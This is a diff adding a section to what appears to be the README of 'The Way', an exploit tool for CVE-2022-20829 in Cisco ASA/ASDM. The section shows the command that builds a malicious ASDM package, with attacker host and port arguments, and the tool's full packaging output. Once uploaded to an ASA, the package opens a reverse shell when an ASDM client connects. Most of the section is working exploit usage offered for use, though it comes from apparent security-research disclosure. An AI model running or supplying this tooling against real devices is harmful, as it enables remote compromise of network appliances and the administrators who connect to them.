@@ -167,6 +167,117 @@ total 51164
 -rw-rw-r-- 1 albinolobster albinolobster      112 Apr 28 11:06 version.prop
 ```
 
+## Malicious Package Generation
+
+The following generates a malicious ASDM package that, when uploaded to an ASA, will generate a reverse shell when an ASDM client connects to the ASA.
+
+```
+albinolobster@ubuntu:~/theway/bu$ ./theway -g --lhost 10.9.49.248 --lport 1270
+
+                         where were they going without ever knowing
+           .              __.....__ 
+         .'|          .-''         '.                   _     _     .-.          .- 
+     .| <  |         /     .-''"'-.  `.           /\    \\   //      \ \        / /
+   .' |_ | |        /     /________\   \          `\\  //\\ //  __    \ \      / /
+ .'     || | .'''-. |                  |            \`//  \'/.:--.'.   \ \    / /
+'--.  .-'| |/.'''. \\    .-------------'             \|   |// |   \ |   \ \  / /
+   |  |  |  /    | | \    '-.____...---.              '     `" __ | |    \ `  /
+   |  |  | |     | |  `.             .'                      .'.''| |     \  /
+   |  '.'| |     | |    `''-...... -'     jbaines-r7        / /   | |_    / /
+   |   / | '.    | '.                   CVE-2022-20829      \ \._,\ '/|`-' /
+   `'-'  '---'   '---'                        🦞             `--'  `"  '..'
+
+[+] Compiling Payload using `javac PDMApplet.java SgzApplet.java`
+[+] Creating JAR entries
+[+] Compressing jar entries with `lzma -z jars`
+[+] Adding sgz wrapper
+[+] Flushing the pdm.sgz to disk
+-> Sizeof manifest entry c
+-> Files to package 
+	-> asdm50-install.msi
+14
+asdm50-install.msi
+	-> asdmversion.html
+14
+asdmversion.html
+	-> dm-launcher.dmg
+10
+dm-launcher.dmg
+	-> dm-launcher.msi
+10
+dm-launcher.msi
+	-> pdm.sgz
+8
+pdm.sgz
+	-> pdmversion.html
+10
+pdmversion.html
+	-> public/asa-pix.gif
+14
+public/asa-pix.gif
+	-> public/asdm.jnlp
+14
+public/asdm.jnlp
+	-> public/asdm32.gif
+14
+public/asdm32.gif
+	-> public/cert.jnlp
+14
+public/cert.jnlp
+	-> public/cisco.gif
+14
+public/cisco.gif
+	-> public/deployJava.js
+18
+public/deployJava.js
+	-> public/dm-launcher.jar
+18
+public/dm-launcher.jar
+	-> public/index.html
+14
+public/index.html
+	-> public/jploader.jar
+14
+public/jploader.jar
+	-> public/lzma.jar
+10
+public/lzma.jar
+	-> public/retroweaver-rt-2.0.jar
+20
+public/retroweaver-rt-2.0.jar
+	-> public/startup.jnlp
+14
+public/startup.jnlp
+	-> version.prop
+10
+version.prop
+-> Entries size: 254
+	->Offset (asdm50-install.msi) (2f8 -> 2fc)
+	->Offset (asdmversion.html) (2f8 -> 2fc)
+	->Offset (dm-launcher.dmg) (2fc -> 300)
+	->Offset (dm-launcher.msi) (300 -> 304)
+	->Offset (pdm.sgz) (304 -> 7ed)
+	->Offset (pdmversion.html) (7f0 -> 7f4)
+	->Offset (public/asa-pix.gif) (7f4 -> 7f8)
+	->Offset (public/asdm.jnlp) (7f8 -> 7fc)
+	->Offset (public/asdm32.gif) (7fc -> 800)
+	->Offset (public/cert.jnlp) (800 -> 804)
+	->Offset (public/cisco.gif) (804 -> 808)
+	->Offset (public/deployJava.js) (808 -> 80c)
+	->Offset (public/dm-launcher.jar) (80c -> 810)
+	->Offset (public/index.html) (810 -> 814)
+	->Offset (public/jploader.jar) (814 -> 818)
+	->Offset (public/lzma.jar) (818 -> 81c)
+	->Offset (public/retroweaver-rt-2.0.jar) (81c -> 820)
+	->Offset (public/startup.jnlp) (820 -> 824)
+	->Offset (version.prop) (824 -> 891)
+c1b7190c7426b2b72a6862c09cc19152
+
+```
+
+The Way will generate "test.final.bin", which can then be uploaded to the ASA.
+
+
 ## Credit
 
 * [Malcolm Lashley](https://gist.github.com/mlashley/7d2c16e91fe37c9ab3b2352615540025): CVE-2021-1585
